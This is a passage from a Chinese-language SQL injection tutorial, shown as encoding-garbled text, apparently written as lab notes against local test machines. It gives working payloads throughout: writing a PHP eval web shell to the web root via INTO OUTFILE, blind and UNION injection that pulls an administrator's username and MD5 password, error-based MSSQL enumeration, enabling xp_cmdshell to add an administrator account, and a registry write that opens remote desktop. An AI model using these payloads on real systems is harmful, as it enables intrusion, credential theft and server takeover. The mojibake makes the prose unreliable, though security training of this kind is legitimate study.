æœ€å¥½æ˜¯mysqlçš„rootç”¨æˆ·ï¼Œè¿™ä¸ªæ¡ä»¶éå¿…é¡»ï¼Œä½†æ˜¯æœ‰æœ€å¥½ 4ï¼Œé€šè¿‡æ³¨å…¥ç‚¹å†™å…¥æœ¨é©¬ç¨‹åº union select ?php @xx($_POST[jaden]);?,2 into outfile C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\jaden.php+--+ union select ?php @eval($_POST[aini]);?,2 into outfile C:\\\\tools\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\aini.php -- ## xxè¡¨ç¤ºevalï¼Œå› ä¸ºç›´æ¥å†™evalï¼Œæˆ‘ä»¬çš„è¿™ä¸ªmdæ–‡æ¡£ä¼šè¢«æ€è½¯æ€æ‰çš„ã€‚ 5ï¼Œé€šè¿‡sqlè¯­å¥å†™å…¥æ–‡ä»¶æµ‹è¯• okï¼Œsqlè¯­å¥æ²¡æœ‰é—®é¢˜ï¼Œå¼€å§‹æ³¨å…¥ï¼Œå…ˆåˆ æ‰jaden.phpå§ã€‚ç›®æ ‡æœåŠ¡å™¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯æ²¡æœ‰jaden.phpæ–‡ä»¶çš„ã€‚ 6ï¼Œå·¥å…·åˆ©ç”¨è¿æ¥ ## 1.æœ¨é©¬ä¸Šä¼ æˆåŠŸäº†## 2.çŸ¥é“æœ¨é©¬çš„è·¯å¾„åœ¨å“ªé‡Œ## 3.ä¸Šä¼ çš„æœ¨é©¬èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ 7ï¼Œè·å¾—åå°çœŸå®ç‰©ç†è·¯å¾„çš„æ–¹æ³•## 1ã€æ”¶é›†ç«™ç‚¹æ•æ„Ÿç›®å½•ï¼Œæ¯”å¦‚phpinfo.phpæ¢é’ˆæ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®åˆ°## 2ã€ç«™ç‚¹ç½‘å€è¾“å…¥ä¸€äº›ä¸å­˜åœ¨çš„ç½‘å€æˆ–è€…åŠ ä¸€äº›éæ³•å‚æ•°æ•°æ®ï¼Œè®©ç½‘ç«™æŠ¥é”™ï¼Œçœ‹é”™è¯¯ä¿¡æ¯ä¸­æ˜¯å¦å­˜åœ¨è·¯å¾„ä¿¡æ¯3ã€æŒ‡çº¹ä¿¡æ¯æ”¶é›† ## nginxé»˜è®¤ç«™ç‚¹ç›®å½•ï¼š /usr/share/nginx/htmlï¼Œé…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/nginx/nginx.conf ## apacheé»˜è®¤ç«™ç‚¹ç›®å½•ï¼š/var/www/html ...## 4ã€é€šè¿‡ç«™ç‚¹å…¶ä»–æ¼æ´æ¥è·å–é…ç½®ä¿¡æ¯ã€çœŸå®ç‰©ç†è·¯å¾„ä¿¡æ¯ï¼Œæ¯”å¦‚å¦‚æœå‘ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(åé¢ä¼šè®²åˆ°å„ç§å…¶ä»–æ¼æ´)ï¼Œé’ˆå¯¹phpçš„ç«™ç‚¹ï¼Œç›´æ¥æ‰§è¡Œä¸€ä¸ªphpinfo()å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°phpinfo.phpæ‰€å±•ç¤ºçš„å„ç§ä¿¡æ¯ç­‰ç­‰ã€‚## 5ã€å…¶ä»–æ€è·¯ï¼Œåæ­£å°±æ˜¯ä¸æ–­çš„å°è¯•ã€‚ 7ï¼Œaccesssæ•°æ®åº“SQLæ³¨å…¥ 7-1 çŒœæ•°æ®åº“è¡¨åhttp://192.168.1.55:901/news_view.asp?id=14 and exists(select * from users) ## mysql5.0ä»¥å‰ç‰ˆæœ¬éƒ½æ˜¯é æš´åŠ›çŒœè§£ï¼Œå‡†å¤‡ä¸ªå­—å…¸(è¡¨åã€åº“åã€å­—æ®µåç­‰)## existsï¼šaccessæ•°æ®æŸ¥è¯¢ç»“æœæ˜¯å¦æœ‰æ•°æ®ï¼Œå¦‚æœæœ‰æ•°æ®ï¼Œexistså¾—åˆ°trueï¼ŒçœŸ## å¦‚æœæ²¡æœ‰æ•°æ®ï¼Œç›´æ¥ç»™ä½ æŠ¥é”™äº† ## è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œè¯´æ˜usersè¡¨ä¸å­˜åœ¨ï¼Œç»§ç»­æäº¤ã€‚existsæ˜¯åˆ¤æ–­æŸä¸ªè¡¨æ˜¯å¦å­˜åœ¨æˆ–è€…è¡¨ä¸­æ˜¯å¦æœ‰æ•°æ®ã€‚## æŠ¥é”™äº†è¯´æ˜æ²¡æœ‰è¿™ä¸ªusersè¡¨ æŸ¥çœ‹æ˜¯å¦æœ‰newsè¡¨ï¼Œæˆ‘ä»¬è¿™æ˜¯æ‰‹å·¥æ ¹æ®ç»éªŒå°è¯•è¡¨åï¼Œåé¢æœ‰å­—å…¸çˆ†ç ´å·¥å…·æ˜‚ã€‚ http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from news) æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜æœ‰newsè¡¨ æŸ¥çœ‹æ˜¯å¦æœ‰ç®¡ç†å‘˜è¡¨ï¼Œåç§°ä¸€èˆ¬ä¸ºadminæˆ–è€…administrator http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from admin) è¿˜æ˜¯è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œè¯´æ˜adminè¡¨ä¸å­˜åœ¨ï¼Œç»§ç»­æäº¤ã€‚ http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from administrator) å´è€æ¿è¿”å›æ­£å¸¸é¡µé¢ï¼Œè¯´æ˜å­˜åœ¨administratorè¡¨(å›¾8 å­˜åœ¨administratorè¡¨ä¸ä¸å­˜åœ¨çš„è¡¨å¯¹æ¯”) 7-2 çŒœæµ‹å­—æ®µåhttp://192.168.1.55:901/news_view.asp?id=14 and exists(select username from administrator)http://192.168.1.55:901/news_view.asp?id=14 and exists(select user_name from administrator)http://192.168.1.55:901/news_view.asp?id=14 and exists(select password from administrator) 7-3 çŒœæµ‹å­—æ®µæ•°æ®çš„é•¿åº¦http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)1select top 1 len(user_name) from administrator #å–å‡ºadministratorè¡¨çš„å‰1è¡Œè®°å½•ï¼Œå¹¶æŸ¥è¯¢è¿™è¡Œè®°å½•çš„user_nameå­—æ®µçš„é•¿åº¦http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)2http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)5 7-4 çŒœå­—æ®µæ•°æ®å†…å®¹http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)0 ## è¿”å›æ­£å¸¸é¡µé¢## è¯´æ˜ASCIIå€¼å¤§äº0 ,å­—æ®µå€¼åº”è¯¥ä¸ºå­—æ¯ï¼Œå¦‚æœæ˜¯å°äº0é‚£ä¹ˆè¯´æ˜æ˜¯æ±‰å­—ï¼Œä¸‹é¢æˆ‘ä»¬ç»§ç»­çŒœè§£ã€‚ ## midæ˜¯ä»ä¸­é—´ä½ç½®å–å­ä¸²å‡½æ•°## æ ¼å¼å¦‚ä¸‹ï¼š## midï¼ˆå­—ç¬¦ä¸²ï¼Œèµ·å§‹ä½ï¼Œæˆªå–çš„ä½æ•°ï¼‰## ä¾‹å¦‚ï¼š## midï¼ˆâ€œabcdefâ€ï¼Œ2ï¼Œ3ï¼‰## ç»“æœæ˜¯bcd## ascæ˜¯æŸ¥çœ‹å­—æ¯åœ¨asciiç è¡¨ä¸­çš„ä»£è¡¨æ•°å­—ï¼ŒASCIIå€¼å¤§äº0 ,å­—æ®µå€¼åº”è¯¥ä¸ºå­—æ¯ï¼Œå¦‚æœæ˜¯å°äº0é‚£ä¹ˆè¯´æ˜æ˜¯æ±‰å­—ï¼Œå› ä¸ºasciiç è¡¨ä¸­æ²¡æœ‰æ±‰å­—ï¼Œè¿”å›è´Ÿæ•° http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)500 ## è¿”å›é”™è¯¯é¡µé¢## è¯´æ˜å­—æ®µå¯¹åº”çš„ASCllå€¼åœ¨0å’Œ500ä¹‹é—´ã€‚ç»§ç»­æäº¤ã€‚http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)100 ##è¿”å›é”™è¯¯é¡µé¢## è¯´æ˜å­—æ®µå¯¹åº”çš„ASCllå€¼åœ¨0å’Œ100ä¹‹é—´ã€‚ç»§ç»­æäº¤ã€‚http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)90 ## è¿”å›æ­£å¸¸é¡µé¢## è¯´æ˜å­—æ®µå¯¹åº”çš„ASCllå€¼åœ¨90å’Œ100ä¹‹é—´ã€‚ç»§ç»­æäº¤ã€‚http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)96 ## è¿”å›æ­£å¸¸é¡µé¢## è¯´æ˜å­—æ®µå¯¹åº”çš„ASCllå€¼åœ¨96å’Œ100ä¹‹é—´ã€‚ç»§ç»­æäº¤ã€‚http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)97 ## è¿”å›é”™è¯¯é¡µé¢## è¯´æ˜administratorè¡¨ä¸­çš„user_nameå­—æ®µçš„ç¬¬ä¸€ä½ASCIIå€¼ä¸º97ã€‚é€šè¿‡åæŸ¥ASCIIå€¼å¯¹åº”çš„å­—æ¯ï¼Œå¾—åˆ°å­—ç¬¦å€¼ä¸ºâ€œaâ€ï¼Œæ¥ç€ç¬¬äºŒä½æŸ¥è¯¢ã€‚http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)99 ## è¿”å›æ­£å¸¸é¡µé¢(æ³¨ï¼šæŸ¥ç¬¬äºŒä¸ªå­—æ¯çš„æ—¶å€™è®°å¾—æŠŠuser_nameåé¢çš„1å˜æˆ2)http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)100 ## è¿”å›é”™è¯¯é¡µé¢## ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå¯çŒœè§£user_nameå­—æ®µå€¼å’Œpasswordå€¼,æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹ç»“æœ:## å¯çœ‹å‡ºpasswordçš„å€¼ä¸º32ä½MD5åŠ å¯†ï¼Œä½¿ç”¨MD5åœ¨çº¿ç ´è§£å·¥å…·è¿›è¡Œç ´è§£ï¼Œå¾—åˆ°æ˜æ–‡å¯†ç ä¸ºadmin[user_name]:admin[password]:21232f297a57a5a743894a0e4a801fc3 å¾—åˆ°ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç åï¼Œç™»å½•åå°:http://192.168.1.55:901/admin/index.aspï¼Œè¾“å…¥çŒœè§£å‡ºæ¥çš„ç”¨æˆ·åå’Œå¯†ç .å°±å¯ä»¥æˆåŠŸè¿›å…¥ç½‘ç«™åå°é¡µé¢ã€‚ 7-5 é«˜çº§æŸ¥è¯¢â€”â€”order by ä¸union select5-1 order-by çŒœå­—æ®µæ˜¯æ•°ç›®order by 1order by 2...order by n-1order by n å¦‚æœn-1æ—¶è¿”å›æ­£å¸¸ï¼Œnæ—¶è¿”å›é”™è¯¯ï¼Œé‚£ä¹ˆè¯´æ˜å­—æ®µæ•°ç›®ä¸ºnã€‚ 5-2 union selectçˆ†å­—æ®µå†…å®¹## å¾—åˆ°å­—æ®µé•¿åº¦åï¼Œå°±å¯åˆ©ç”¨union selectæŸ¥è¯¢è·å¾—å­—æ®µå†…å®¹äº†ã€‚and 1=2 union select 1, 2, 3...., n from è¡¨å## æ‰§è¡Œä¸Šé¢çš„æŸ¥è¯¢æ—¶ï¼Œåœ¨é¡µé¢ä¸­ä¼šè¿”å›æ•°å­—ï¼Œä¿®æ”¹æŸ¥è¯¢è¯­å¥ä¸­çš„æ•°å­—ä¸ºå­—æ®µåï¼Œä¾‹å¦‚æäº¤å¦‚ä¸‹ä»£ç ã€‚and 1=2 union select1, å­—æ®µ1, å­—æ®µ2...., n from è¡¨å## åœ¨é¡µé¢ä¸­å°±ä¼šè¿”å›å­—æ®µå†…å®¹ï¼Œä¸å¿…ä¸€ä¸ªä¸€ä¸ªè¿›è¡ŒçŒœè§£äº† æµ‹è¯•å®ä¾‹ http://192.168.1.55:901/news_view.asp?id=14 order by 1 ## æ­£å¸¸http://192.168.1.55:901/news_view.asp?id=14 order by 7 ##æ­£å¸¸http://192.168.1.55:901/news_view.asp?id=14 order by 8 ## é”™è¯¯ ## è¯´æ˜å­—æ®µæ•°ç›®ä¸º7 ï¼Œå› æ­¤å¯æäº¤ä»¥ä¸‹å­—æ®µã€‚http://192.168.1.55:901/news_view.asp?id=14 union select 1,2,3,4,5,6,7 from administrator ## (é€šè¿‡è”åˆæŸ¥è¯¢ä»è¿™7ä¸ªå­—æ®µé‡Œé¢å»æŸ¥è¯¢administratorè¡¨é‡Œé¢é‚£äº›æ˜¯å¯å†™çš„æ•°å­—) ## ä»é¡µé¢è¿”å›ä¿¡æ¯ä¸­ï¼Œå¯çœ‹åˆ°æ˜¾ç¤ºäº†æ•°å­—2å’Œ3ã€‚å› æ­¤å¯ä»¥å°†è¿™2ä¸ªæ•°å­—æ›¿æ¢ä¸ºæˆ‘ä»¬æƒ³è¦æ•°æ®çš„å­—æ®µåï¼Œæäº¤å¦‚ä¸‹æŸ¥è¯¢ã€‚http://192.168.1.55:901/news_view.asp?id=14 union select 1,user_name,password,4,5,6,7 from administrator## åœ¨é¡µé¢è¿”å›ä¿¡æ¯ä¸­ï¼Œç«‹å³è·å¾—äº†user_nameå’Œpasswordå­—æ®µçš„å€¼ï¼Œæ¯”å‰é¢çš„æ–¹æ³•å¿«é€Ÿé«˜æ•ˆå¤šäº†ã€‚ æœ‰äº†åå°ç”¨æˆ·åå’Œå¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ‰¾åˆ°åå°ç™»å½•ç½‘å€å°±å¯ä»¥äº† ä½¿ç”¨7kbæˆ–è€…å¾¡å‰‘ç­‰æ”»å‡»æ¥æ‰«æç›®å½• ç™»å½•å°±å¯ä»¥ä¿®æ”¹é‡Œé¢çš„æ•°æ®ï¼Œæˆ–è€…æ’å…¥ä¸€äº›æœ¨é©¬åœ¨é‡Œé¢äº† 8ï¼Œmssqlæ³¨å…¥ 8-1 sqlserver ä¸‰ä¸ªæƒé™çº§åˆ«é¦–å…ˆçŸ¥é“ä¸€ä¸‹mssqlçš„æƒé™ï¼šsaã€dbownerã€publicä¸‰å¤§æƒé™ï¼Œsaæ˜¯æœ€é«˜æƒé™(ç±»ä¼¼äºwindowsçš„systemã€linuxçš„rootæƒé™) ## saæƒé™ï¼šæ•°æ®åº“æ“ä½œï¼Œæ–‡ä»¶ç®¡ç†ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ³¨å†Œè¡¨è¯»å–ç­‰ï¼Œé«˜æƒé™## dbæƒé™ï¼šæ–‡ä»¶ç®¡ç†ï¼Œæ•°æ®åº“æ“ä½œç­‰## publicæƒé™ï¼šæ•°æ®åº“æ“ä½œç­‰ Mssqlçš„é»˜è®¤ç«¯å£å·ä¸º1433ï¼Œoracleæ˜¯1521ï¼Œmysqlæ˜¯3306ï¼Œåœ¨windowsä¸‹é€šè¿‡ netstat -an -p tcp -o æŒ‡ä»¤å°±èƒ½çœ‹åˆ°ï¼Œå¹¶ä¸”å¯ä»¥æŸ¥çœ‹åˆ°å¯¹åº”çš„è¿›ç¨‹pidï¼Œåœ¨é€šè¿‡ä»»åŠ¡ç®¡ç†å™¨ä¸­çš„pidå¯ä»¥çœ‹åˆ°è¿›ç¨‹æ˜¯è°ã€‚mssqlé»˜è®¤æ˜¯å¯ä»¥è¿œç¨‹è¿æ¥çš„ï¼Œmysqléœ€è¦æˆæƒæ‰èƒ½è¿œç¨‹è¿æ¥ã€‚ 8-2 æŸ¥è¯¢å‡½æ•°db_name() ## æ•°æ®åº“å@@version ## ç‰ˆæœ¬ä¿¡æ¯User_name() ## å½“å‰ç”¨æˆ·host_name() ## è®¡ç®—æœºåç§° 8-3 æ³¨é‡Šç¬¦--ç©ºæ ¼ ## å•è¡Œæ³¨é‡Š/**/ ## å¤šè¡Œæ³¨é‡Š 8-4 åˆ¤æ–­æ³¨å…¥ å•å¼•å· æ˜¯å¦æŠ¥é”™and 1=1 and 1=2 é¡µé¢æ˜¯å¦ç›¸åŒ 8-5 åˆ¤æ–­åˆ—æ•°order by 8-6 è”åˆæ³¨å…¥sqlserverå¯¹æ•°æ®ç±»å‹æ¯”è¾ƒä¸¥è°¨ union select 1,2,3 ## è¡¨æ˜ï¼Œæ•°æ®ç±»å‹ä¸å…¨æ˜¯intå‹ï¼Œé€æ­¥è°ƒè¯•## ä¸€èˆ¬æ¥è¯´åˆ—éƒ½æ˜¯idï¼Œå¯¹åº”çš„å°±æ˜¯intå‹union select 1,2,3union select 1,2,3 ä¹Ÿå¯ä»¥é€šè¿‡ null æ¥æŸ¥çœ‹ 8-7 æŸ¥è¯¢æ•°æ®union select 1,username,password from admin å¦‚æœå­—æ®µæˆ–è€…è¡¨åä¸å­˜åœ¨ï¼Œåˆ™ä¼šæŠ¥é”™ 8-8 æŠ¥é”™æ³¨å…¥8-1 æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯and @@version 1and user_name() 1and db_name() 1 @@versionæ˜¯å­—ç¬¦ä¸²ï¼Œ0æ˜¯æ•´æ•°å‹ï¼›åˆ©ç”¨mssqlåœ¨è½¬æ¢ç±»å‹çš„æ—¶å€™å‡ºé”™ï¼Œä¼šæç¤ºä¿¡æ¯ 8-2 çˆ†åº“and (select top 1 name from master..sysdatabases) 0## æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åä¸­çš„ä¸ª ## è¯¢æ‰€æœ‰æ•°æ®åº“åï¼Œé™¤äº†masterand (select top 1 name from master..sysdatabases where name not in (master)) 0##æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼Œé™¤äº†master,iNethinkCMSand (select top 1 name from master..sysdatabases where name not in (master,iNethinkCMS)) 0 8-3 çˆ†è¡¨## æŸ¥è¯¢æŒ‡å®šåº“ä¸­çš„è¡¨åçš„ä¸ªand (select top 1 name from master.sys.all_objects where type=u and is_ms_shipped=0) 0and (select top 1 name from MYDB.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (cmd,test_tmp)) 0 8-4 çˆ†è£‚## æŸ¥è¯¢æŒ‡å®šåº“æŒ‡å®šè¡¨ä¸­çš„åˆ—åand (select top 1 column_name from mydb.information_schema.columns where table_name=admin) 0 8-5 çˆ†æ•°æ®## çˆ†ç”¨æˆ·åand (select top 1 username from admin) 1## å¦‚æœå†ä¹Ÿæ²¡æœ‰å¯çˆ†çš„ç”¨æˆ·åï¼Œé¡µé¢ä¼šæ˜¾ç¤ºæ­£å¸¸and (select top 1 username from admin where username not in (admin)) 1 9ï¼Œmssqlæƒé™è¯´æ˜å’Œæ“ä½œ9-1 æ³¨å…¥ç‚¹ç±»å‹åˆ¤æ–­é¦–å…ˆï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯MsSQLæ³¨å…¥ç‚¹ï¼Œä¹Ÿå°±æ˜¯å…ˆåˆ¤æ–­ä¸€ä¸‹ç½‘ç«™çš„æ•°æ®åº“æ˜¯ä¸æ˜¯mssqlæ•°æ®åº“ï¼Œå¯æäº¤å¦‚ä¸‹æŸ¥è¯¢. and exists (select * from sysobjects) ## select * from admin where id=1 and exists (select * from sysobjects) sysobjectsæ˜¯ä¸€ä¸ªmssqlè‡ªå¸¦çš„ç³»ç»Ÿè¡¨ # æ³¨å…¥ï¼šæ¯”å¦‚ http://192.168.169.200/sqlserver/1.aspx?xxser=1 and exists (select * from sysobjects)## é¡µé¢è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜ä¸ºMsSQLæ³¨å…¥ç‚¹ã€‚## ä¸€èˆ¬aspxå¤šæ•°æ˜¯é…åˆmssqlæ•°æ®åº“çš„ã€‚ 9-2 æŸ¥è¯¢å½“å‰æ•°æ®åº“ç³»ç»Ÿçš„ç”¨æˆ·åand system_user=0 ## æŠ¥é”™ä»¥åæŠŠç”¨æˆ·åçˆ†å‡ºæ¥äº†# http://192.168.1.55/sqlserver/1.aspx?xxser=1 and system_user=0 9-3 è®¾ç½®æƒé™ç”¨æˆ·1ã€ç”¨Windows èº«ä»½éªŒè¯æ–¹å¼æˆ– saç”¨æˆ· è¿æ¥æœåŠ¡å™¨ï¼Œæ‰“å¼€å®‰å…¨æ€§ â†’ å³å‡»ç™»å½•å â†’ æ–°å»ºç™»å½•å 2ã€å¸¸è§„è®¾ç½®ï¼š ## 1ã€è¾“å…¥è´¦æˆ·åï¼Œå¯†ç ## 2ã€å»æ‰å¯†ç ç­–ç•¥çš„å‹¾## 3ã€æ ¹æ®éœ€è¦é€‰æ‹©é»˜è®¤æ•°æ®åº“ï¼Œé»˜è®¤è¯­è¨€ 3ã€æœåŠ¡å™¨è§’è‰² æ ¹æ®éœ€è¦æˆäºˆè§’è‰²æƒé™ï¼Œé»˜è®¤å‹¾é€‰ Publicï¼Œä¸€èˆ¬å¤Ÿç”¨äº†ã€‚ 4ã€ç”¨æˆ·æ˜ å°„ ## å‹¾é€‰æ˜ å°„çš„æ•°æ®åº“ï¼Œå³è¯¥ç”¨æˆ·å¯ä»¥è®¿é—®çš„æ•°æ®åº“ï¼Œè¿™è¾¹å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯¹æ•°æ®åº“è®¿é—®æƒé™çš„æ§åˆ¶## å‹¾é€‰æ•°æ®åº“è§’è‰²æˆå‘˜èº«ä»½ï¼Œè¿™è¾¹å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯¹æ•°æ®åº“æ“ä½œæƒé™çš„æ§åˆ¶ ## db_datereader:åªè¯»çš„æƒé™ ## db_datawirter:åªå†™çš„æƒé™ ## db_owner: æ•°æ®åº“æ‹¥æœ‰è€…æƒé™ï¼Œå¢åˆ æ”¹æŸ¥å¤‡ä»½ç­‰éƒ½å¯ä»¥åš ## publicæƒé™ï¼šé»˜è®¤æƒé™ï¼Œå¢åˆ æ”¹æŸ¥éƒ½å¯ä»¥ï¼Œå¦‚æœæƒ³è®©ç”¨æˆ·åªè¯»ï¼Œé‚£ä¹ˆå°±å†å‹¾é€‰ä¸Šdb_datereaderè§’è‰² 5ã€å®‰å…¨å¯¹è±¡ã€çŠ¶æ€ é»˜è®¤å³å¯ï¼Œå¯ä»¥ä¸è®¾ç½®ã€‚å¦‚æœ‰ç‰¹æ®Šéœ€è¦å†å»è®¾ç½®ã€‚ æ¥ä¸‹æ¥å°±å¯ä»¥æ–°å»ºæ•°æ®åº“ï¼Œç„¶åæ–°å»ºç”¨æˆ·ã€åˆ†é…æƒé™è¿›è¡Œæ“ä½œäº†ã€‚ 10ï¼Œ ä¸‰å¤§æƒé™æ³¨å…¥10-1 saæƒé™æ³¨å…¥1-1 æ£€æŸ¥æ˜¯å¦æ˜¯saæƒé™å¦‚æœè¿”å›çš„æ˜¯saï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥åˆ¤æ–­å‡ºç”¨æˆ·çš„æƒé™ï¼Œä½†æ˜¯è¿™é‡Œåªæœ‰æäº¤å¦‚ä¸‹é“¾æ¥æŸ¥è¯¢çš„æƒé™ http://192.168.1.55/sqlserver/1.aspx?xxser=1 and 1=(select IS_SRVROLEMEMBER(sysadmin)) ## å…·å¤‡saæƒé™åˆ™è¿”å›1ï¼Œä¸å…·å¤‡åˆ™è¿”å›0ï¼Œæ‰€ä»¥å¯ä»¥1= æˆ–è€…0= æ¥é€»è¾‘åˆ¤æ–­ ä½†æ˜¯è¿™ä¸ªè¯­å¥æœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆå¿½ç•¥ä»–å§ï¼Œå› ä¸ºä¸ç®¡è¾“å…¥çš„åç§°æ˜¯ä¸æ˜¯sysadminï¼Œéƒ½ä¸ä¼šæŠ¥é”™ã€‚ 1-2 åˆ¤æ–­ä¸€ä¸‹xp_cmdshellå­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨xp_cmdshellæ˜¯mssqlæ•°æ®åº“çš„æ‰©å±•å­˜å‚¨åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥ç›´æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„æŒ‡ä»¤(ipconfigã€pwdç­‰ç­‰)ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿™ä¸ªåŠŸèƒ½æ˜¯ç¦ç”¨çŠ¶æ€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè¦çœ‹çœ‹æ˜¯å¦å¼€å¯äº†ï¼Œä½†æˆ‘ä»¬éœ€è¦æ‰“å¼€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªè¡Œæ‰“å¼€ï¼Œä½†æ˜¯è¿™ä¸ªåŠŸèƒ½åªèƒ½æ˜¯saè¿™æ ·çš„æƒé™ç”¨æˆ·æ‰èƒ½å¼€å¯ï¼Œdbownerã€publicç­‰æƒé™éƒ½æ˜¯ä¸èƒ½å¼€å¯çš„ï¼Œå¥½ï¼Œæ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¼€å¯äº†ï¼š http://192.168.1.55/sqlserver/1.aspx?xxser=1 and 1=(select count(*) from master.dbo.sysobjects where name =xp_cmdshell) æ•ˆæœå…¥ä¸‹ è¿”å›æ­£å¸¸é¡µé¢ï¼Œè¯´æ˜æ‰©å±•å­˜å‚¨å­˜åœ¨ã€‚ å¦‚æœå‘ç°æŠ¥é”™äº†ï¼Œè¯´æ˜æ‰©å±•æ²¡æœ‰å¼€å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ¢å¤ä¸€ä¸‹æˆ–è€…è¯´æ‰“å¼€ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œå¦‚ä¸‹æ“ä½œ 1-3 æ¢å¤xp_cmdshell## æ¢å¤xp_cmdshellå¯ä»¥ç”¨ EXEC sp_configure show advanced options, 1;RECONFIGURE;EXEC sp_configure xp_cmdshell, 1;RECONFIGURE;-- å¼€å¯äº†xp_cmdshellï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±å¯ä»¥æ·»åŠ ç”¨æˆ·ç­‰æ“ä½œäº†ã€‚ 1-4 æ·»åŠ è´¦å·ç°åœ¨æ“ä½œç³»ç»Ÿä¸­åˆ é™¤ä¹‹å‰çš„testç”¨æˆ· ## æ³¨å…¥æŒ‡ä»¤ï¼š ;exec master..xp_cmdshell net user jaden 123456 /add## æ¯”å¦‚ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1;exec%20master..xp_cmdshell%20%27net%20user%20test%20test%20/add å»æ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹ä¸€ä¸‹testç”¨æˆ·æ˜¯å¦åˆ›å»ºæˆåŠŸäº†ï¼Œå‘ç°å·²ç»åˆ›å»ºæˆåŠŸ 1-5 å°†è´¦å·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„;exec master..xp_cmdshell net localgroup administrators aini /add æ•ˆæœï¼š Â·1-6 å¼€3389è¿œç¨‹è¿æ¥ç«¯å£æ—¢ç„¶å·²ç»æ˜¯ç®¡ç†å‘˜ç»„çš„ç”¨æˆ·äº†ï¼Œé‚£ä¹ˆåˆ«äººæƒ³è¿œç¨‹æ§åˆ¶ä½ çš„ç”µè„‘ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥å¼€å¯3389ç«¯å£ï¼Œé»˜è®¤è¿œç¨‹æ¡Œé¢æ˜¯å…³é—­çš„ã€‚ä¸‹é¢çš„æ˜¯é€šè¿‡cmdæŒ‡ä»¤ä¿®æ”¹æ³¨å†Œè¡¨çš„ä¸€ä¸ªé€‰é¡¹æ¥å¼€å¯3389 ;exec master.dbo.xp_regwriteHKEY_LOCAL_MACHINE,SYSTEM\\CurrentControlSet\\Control\\Terminal Server,fDenyTSConnections,REG_DWORD,0; æ•ˆæœï¼š å¼€å¯äº† ç„¶åï¼Œæ¯”å¦‚é€šè¿‡æˆ‘ä»¬ç‰©ç†æœºï¼Œæˆ‘çš„ç‰©ç†æœºæ˜¯win10ï¼Œæ¥è¿œç¨‹è¿æ¥ä¸€ä¸‹win2003çš„è™šæ‹Ÿæœºï¼Œwin10ä¸Šä½¿ç”¨å¿«æ·é”®ã€winã€‘ã€Rã€‘ï¼Œè¾“å…¥ã€mstscã€‘è°ƒå‡ºè¿œç¨‹æ¡Œé¢ç•Œé¢ã€‚ ç™»å½•æˆåŠŸ é‚£è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥æäº‹æƒ…äº†ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æ˜¯è¿ç»´äººå‘˜ï¼Œåƒä¸‡ä¸è¦å¯åŠ¨saè´¦å·ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ï¼Œä½ çœ‹æˆ‘ä»¬æ•°æ®åº“è¿™é‡Œï¼Œè‚¯å®šæ˜¯å¯ç”¨äº†çš„ 10-2 dbowneræƒé™æ³¨å…¥2-1 æŸ¥çœ‹å½“å‰ç½‘ç«™æ˜¯å¦ä¸ºdb_owneræƒé™## 